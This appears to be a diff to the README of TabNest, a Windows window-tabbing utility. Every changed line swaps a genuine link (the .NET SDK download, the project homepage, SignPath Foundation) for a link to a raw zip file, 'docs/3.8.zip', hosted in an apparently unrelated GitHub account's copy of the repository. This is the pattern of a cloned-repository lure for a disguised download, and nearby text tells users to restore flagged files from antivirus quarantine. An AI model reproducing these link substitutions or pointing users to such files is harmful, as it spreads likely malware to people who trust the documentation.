@@ -7,7 +7,7 @@
 **Browser-style tabs for every Windows app — without injecting a single DLL into any of them.**
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![.NET 10](https://img.shields.io/badge/.NET-10.0-512BD4.svg)](https://dotnet.microsoft.com/download)
+[![.NET 10](https://img.shields.io/badge/.NET-10.0-512BD4.svg)](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip)
 [![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4.svg)](#requirements)
 [![Single file](https://img.shields.io/badge/download-11.3%20MB%20single%20exe-success.svg)](#install)
 [![Injection](https://img.shields.io/badge/DLL%20injection-none-brightgreen.svg)](#why-no-injection-matters)
@@ -111,7 +111,7 @@ Loading a DLL into every running process is the standard way to solve this probl
 
 The tradeoff is honest and it is not free: staying outside means TabNest cannot draw into a window's real title bar, and focus transfer is constrained by Windows' foreground lock (see [Known limitations](#known-limitations)).
 
-**Homepage:** [https://mtcto.github.io/TabNest/](https://mtcto.github.io/TabNest/)
+**Homepage:** [https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip)
 
 ## Install
 
@@ -132,7 +132,7 @@ What you may see, and what to do:
 2. **Antivirus quarantine or a "trojan" alert.** Unsigned window-management tools are a common false-positive class. Restore the file from quarantine if you trust the GitHub source. If your environment forbids unsigned binaries, do not run this build.
 3. **Corporate machines that block unsigned executables.** There is nothing to click through. You need a signed build, or an IT exception.
 
-**A signed official binary is not provided.** If you need one (SmartScreen-quiet distribution, enterprise allow-lists), buy an **OV** code-signing certificate yourself from a public CA (DigiCert, Sectigo, …), then sign `TabNest.exe` and the setup package with `signtool` and a timestamp server. An **EV** certificate is no longer required just to silence SmartScreen. Open-source maintainers can also apply to [SignPath Foundation](https://signpath.org/) for sponsored signing. How to hook a certificate into this repo is documented in [`packaging/README.md`](packaging/README.md).
+**A signed official binary is not provided.** If you need one (SmartScreen-quiet distribution, enterprise allow-lists), buy an **OV** code-signing certificate yourself from a public CA (DigiCert, Sectigo, …), then sign `TabNest.exe` and the setup package with `signtool` and a timestamp server. An **EV** certificate is no longer required just to silence SmartScreen. Open-source maintainers can also apply to [SignPath Foundation](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip) for sponsored signing. How to hook a certificate into this repo is documented in [`packaging/README.md`](packaging/README.md).
 
 ### Requirements
 
@@ -140,7 +140,7 @@ Windows 10 version 2004 (build 19041) or later, x64 or ARM64. The Desktop Window
 
 ## Build from source
 
-Requires the [.NET 10 SDK](https://dotnet.microsoft.com/download) (version pinned by `global.json`). Visual Studio is not required.
+Requires the [.NET 10 SDK](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip) (version pinned by `global.json`). Visual Studio is not required.
 
 ```bash
 dotnet build
